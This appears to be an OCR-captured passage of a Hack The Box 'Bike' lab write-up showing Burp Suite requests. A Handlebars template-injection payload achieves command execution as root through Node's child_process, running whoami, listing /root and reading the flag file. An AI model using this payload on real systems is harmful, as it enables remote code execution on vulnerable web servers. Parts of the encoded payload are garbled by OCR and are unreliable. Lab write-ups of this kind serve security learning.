    Dashboard
    Target
    Proxy
    Intruder
    Repeater
    Sequencer
    Decoder
    Col
    3 x
    . ..
    Send
    Cancel
    Request
    Pretty
    Raw Hex
    1 POST / HTTP/1. 1
    2 Host: 10. 129.97. 64
    3 User - Agent: Mozilla/5.0 (Xll; Linux x86_64; rv:91.0) Gecko/20100101
    Firefox/91. 0
    4 Accept:
    text/html, application/xhtml+xml, application/xml; q=0.9, image/webp, \*/\*;q=0
    . 8
    5 Accept - Language: en- US, en; q=0.5
    6 Accept- Encoding: gzip, deflate
    7 Content- Type: application/x-www-form-urlencoded
    8 Content - Length: 1883
    9 Origin: http://10. 129.97.64
    10 Connection: close
    11 Referer: http://10. 129.97.64/
    12 Upgrade- Insecure- Requests: 1
    13
    14 email=
    %76%76%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72:69%6e%67%7c%7d
    %7d%Oa%20%20%76%76%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%76%7b
    %23%77%69%7 4%68%20%73%70%6c69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74
    67c7d%7d%Oa%20%20%20%20%20%20%76%76%74%6869%73%2es70%6f%70%7d%7d%Oa%20
    620%20%20%20%20%7%76%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70
    620%73%74%7269%6e%67%2e%73%75%62%20%22:63%6f%%6e%73%74%72675%63%74%6f %72
    622%29%7d%7d%Oa%20%20%20%20%20%20%76%76%74%68%69%73%2e%70%6f%70%7d%7d%Oa
    620%20%20%20%20%20%76%76%23%77%69%74%68%20%73%74%72869%6%67%2e%73%70%6c
    $69%74%20%61%73%20%7c%63%6f%64%65%6c:69%73%74%7c%7d%7d%Oa%20%20%20%20%20
    620%20%20%76%76%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20
    676%76%74%6869%73%2e%70%75%73%68%20%22%72:65%74%75%72%6e%20%67%6c%6f%62
    61%6c%2e%70%72%6f%63%65%73%73%2e%6d%61:69%6e%4d%6f%64%75%6c%65%2e%63%6f
    6e%73%74%72%75%63%74%6f%72%2e%5f%6c%6f%61%64%28%27%63%68%69%6c%64%5f%70
    672%6f %63%65%73%73%27%29%2es65%78%65%63:53%79%6ex63%28%27%77%68%6f%61%6d
    669%27%29%36%22%7d%7d%Oa%20%20%20%20%20%20%20%20%76%76%74%68%69%73%2e%70
    6f%70%7d%7d%Oa%20%20%20%20%20%20%20%20%76%76%23%65%61%63%68%20%63%6f%6e
    6736c%69%73%74%7d%7d%Oa%20%20%20%20%20%20%20%20%20%20%76%76%23%77%69%74
    %68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f
    %64%65%6c%69%73%74%29%7d%7d%Oa%20%20%20%20%20%20%20%20%20%20%20%20%7%7b
    %74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%76%76%2f%77%69%74%68
    67d%7d%Oas20%20%20%20%20%20%20%20%76%76%2f%65%61%63%68%7d%7d%Oas20%20%20
    %20%20%20%76%76%2f%77%69%74%68%7d%7da%20%20%20%20%76%76%2f %77%69%74%68
    67d%7d%0a%20%20%76%76%2f%77%69%74%68%7d%7d%0a%76%76%2f%77%69%74%68%7d%7d
    &action=Submit
    Now click on the "Send" button.
    Send
    Cancel
    < < > >Y
    Request
    Pretty
    Raw Hex
    Response
    Pretty Raw Hex Render
    </input>
    36
    <button type="submit" class="button-54" name="action" value="Submit">
    Submit
    </button>
    37
    </form>
    38
    </div>
    39
    <p class=" result">
    40
    We will contact you at:
    41
    2
    42
    \[object object\]
    43
    function Function() { \[native code\] }
    44
    2
    45
    \[object object\]
    46
    root
    In the response we see that the output of the whoami command is root . This means that we have
    successfully run system commands on the box and also that the web server is running in the context of the
    root user. We can now proceed one of two ways. We can either get a Reverse Shell on the affected system,
    or directly grab the flag. In this writeup we will focus on the latter.
    We know that the flag is most probably located in / root but we can also verify this. Let's change our
    command from whoami to Is /root to list all files and folders in the root directory.
    {{#with "s" as \[string/} }
    { {#with "e"}}
    {{#with split as (conslist/} }
    {{this . pop} }
    {{this . push (lookup string. sub "constructor" )}}
    { {this . pop} }
    ({#with string . split as \[codelist/} }
    {{this . pop} }
    { {this. push "return process . mainModule. require( 'child_process' ) . execSync( 'Is
    /root ' ) ; "}}
    {{this. pop} }
    {{#each conslist} }
    {{#with (string. sub. apply 0 codelist)} }
    {{this} }
    {{/with} }
    {{/each} }
    {{/with} }
    {{/with} }
    {{/with} }
    {{/with} }
    URL encode the payload and send it as shown before. In the response we see the following.
    We will contact you at:
    2
    \[object Object\]
    function Function( ) { \[native code\] }
    2
    \[object Object\]
    Backend
    flag . txt
    snap
    The flag is indeed in /root and is called flag. txt . Let's modify our payload in order to read it.
    {{#with "s" as \[string/} }
    {{#with "e"}}
    {{#with split as \[conslist/} }
    {{this . pop}}
    {{this . push (lookup string. sub "constructor" ) } }
    {{this . pop} }
    {{#with string . split as \[codelist/} }
    {{this. pop}}
    {{this. push "return process .mainModule. require( 'child_process' ) . execSync( 'cat
    /root/flag. txt' ); "} }
    {{this. pop} }
    {{#each conslist} }
    {{#with (string. sub. apply 0 codelist)}}
    {{this} }
    {{/with} }
    {{/each} }
    {{/with} }
    {{/with} }
    {{/with} }
    {{/with} }
    The flag is shown in the server response and can be copied and pasted to the Hack The Box platform.
    We will contact you at:
    2
    \[object Object\]
    function Function( ) { \[native code\] }
    2
    \[object Object\]
    6b\* \* \* \* \* \* \* \* \* \* \* \*
    Congratulations, you have finished the Bike box.

